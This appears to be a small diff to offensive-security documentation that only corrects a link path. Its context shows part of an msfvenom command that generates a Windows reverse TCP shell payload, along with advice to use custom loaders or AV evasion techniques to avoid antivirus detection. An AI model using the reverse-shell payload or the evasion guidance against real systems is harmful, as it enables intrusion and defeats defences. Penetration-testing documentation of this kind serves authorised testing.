@@ -442,7 +442,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shika
 ```
 
 :::warning
-Encoded Metasploit payloads are heavily signatured by modern AV. Use custom loaders or the techniques in the [AV Evasion](/red-teaming/evasion/av-evasion) page for better results.
+Encoded Metasploit payloads are heavily signatured by modern AV. Use custom loaders or the techniques in the [AV Evasion](/red-team/evasion/av-evasion) page for better results.
 :::
 
 ---
